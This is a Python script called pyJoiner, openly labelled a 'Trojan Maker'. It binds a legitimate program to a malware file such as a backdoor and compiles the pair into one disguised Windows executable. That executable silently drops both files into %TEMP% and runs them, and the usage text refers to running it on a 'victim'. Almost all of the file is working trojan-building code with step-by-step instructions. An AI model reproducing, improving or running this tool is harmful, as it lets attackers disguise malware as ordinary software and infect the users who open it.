#
# pyJoiner - Kali Linux Version
# Open Source Exe Joiner
# Coder: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)
#
# pyJoiner is used for join files, similar SFX, but the major difference
# is that pyJoiner silenty extracts joined files in %TEMP% directory and
# execute them.
# 
# After process, /root/pyJoiner_output/py_file.exe will be generated. 
# The output py_file.exe file must be execute under Windows platform.
# 
#
# Usage: python3.4 pyJoiner.py

import os, urllib.request

def install_Python_PyInstaller():
    
    pyInstaller = '/root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
    python_url = 'https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi'
    python_directory = '/root/.wine/drive_c/Python34'
    python_tmp = '/tmp/python-3.4.4.msi'

    if not os.path.exists(python_directory):
        print('Python 3.4.4 was not installed in', python_directory)
        print('Making download and installation of Python 3.4.4')
        print('Please waiting...')
        urllib.request.urlretrieve(python_url, python_tmp)
        os.system('wine msiexec /i %s' %python_tmp)
        print('Python installation done!')
        print('Removing', python_tmp)
        os.remove(python_tmp)
        print()

    if not os.path.exists(pyInstaller):
        print('PyInstaller was not installed in', pyInstaller)
        print('Making download and installation of PyInstaller')
        print('Please waiting...')
        os.system('wine /root/.wine/drive_c/Python34/python.exe /root/.wine/drive_c/Python34/Scripts/pip.exe install pyinstaller')
        print('PyInstaller installation done!')
        print()

def banner():
    print('''
##########################################################################
#                                                                        #
#            pyJoiner - Open Source Exe Joiner (Trojan Maker)            #
#                                                                        #
#                                                                        #
#                                                                        #
# Coder: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)                  #
#                                                                        #
#                                                                        #
# What is pyJoiner?                                                      #
#                                                                        #
# pyJoiner is used for join files, like self-extracting archive (SFX).   #
# The major difference resides in fact that pyJoiner extracts files      #
# in %TEMP% Windows directory and executes them.                         #
#                                                                        #
#                                                                        #
# Why use pyJoiner?                                                      #
#                                                                        #
# To create Torjan Horses.                                               #
# Supose you have two files. First file, a legitm software,              #
# e.g "game.exe".                                                        #
# Second file, a malware, e.g "backdoor.exe".                            #
# pyJoiner join first and second file in only one file: "py_file.exe".   #
# "py_file.exe", when executed, extracts and execute, first ("game.exe") #
# and second ("backdoor.exe") files at same time.                        #
#                                                                        #
#                                                                        # 
# How to use pyJoiner?                                                   #
#                                                                        #
# e.g: "game.exe" is your first file. Please type "game.exe" when        #
# pyJoiner ask you "1st file: "                                          #
# "backdoor.exe" is your second file. Please type "backdoor.exe" when    #
# pyJoiner ask you "2nd file: "                                          #
#                                                                        #
#                                                                        #
# After all, "/root/pyJoiner_output/py_file.exe" will be generated.      #
#                                                                        #
#                                                                        #
#                              ATENTION                                  #
#                                                                        #
# "py_file.exe", when executed, extracts "output_file1*" and             #
# "output_file2*" under Windows %TEMP% directory.                        #
# Manual remove the files if you wanna reexecute "py_file.exe" in victim #
#                                                                        #
##########################################################################
''')

class FileExtensionError(Exception):
    def __str__(self):
        return 'File is not ".ico"'

class file:
    def __init__(self,name):
        self.name = name
        self.extension = os.path.splitext(self.name)[1]

    def create_py_file(file1,file2):
        with open(file1.name, 'rb') as file_n1:
            with open(file2.name, 'rb') as file_n2:
                if not os.path.exists('/root/pyJoiner_output'):
                    os.mkdir('/root/pyJoiner_output')
                with open('/root/pyJoiner_output/py_file.pyw', 'w') as py_file:
                    py_file.write('''import os

def join(file,file_name, file_extension):

    if not os.path.exists(os.environ["TEMP"]+os.sep+file_name+file_extension):
        with open(os.environ["TEMP"]+os.sep+file_name+file_extension,"wb") as output_file:
            output_file.write(file)
    os.startfile(os.environ["TEMP"]+os.sep+file_name+file_extension)

file1 = %s
file2 = %s

join(file1, "output_file1", "%s")
join(file2, "output_file2", "%s") ''' %( str(file_n1.read()), str(file_n2.read()), file1.extension, file2.extension))

    @staticmethod
    def compile_with_PyInstaller():
        while True:
            wanna_icon = input('Icon? (y)es, (n)o: ').lower()
            if wanna_icon == 'y' or wanna_icon == 'yes':
                icon = input('Icon: ')
                if not os.path.exists(icon):
                    raise FileNotFoundError('Icon "%s" not found' %icon)
                if os.path.splitext(icon)[1] != '.ico':
                    raise FileExtensionError

                print('Please wait until PyInstaller compile files...')
                os.system('wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
                          ' --distpath /root/pyJoiner_output'
                          ' --workpath /root/pyJoiner_output'
                          ' --specpath /root/pyJoiner_output'
                          ' --icon %s --windowed --onefile /root/pyJoiner_output/py_file.pyw' %icon)
                break

            elif wanna_icon == 'n' or wanna_icon == 'no':
                print('Please wait until PyInstaller compile files...')
                os.system('wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'
                          ' --distpath /root/pyJoiner_output'
                          ' --workpath /root/pyJoiner_output'
                          ' --specpath /root/pyJoiner_output'
                          ' --windowed --onefile /root/pyJoiner_output/py_file.pyw')
                break

            else:
                print('Only (y)es or (n)o')
        
        print('Done! Files are in /root/pyJoiner_output')


banner()
install_Python_PyInstaller()

file1 = file(input('1st file: '))
file2 = file(input('2nd file: '))
    
file.create_py_file(file1,file2)
file.compile_with_PyInstaller()
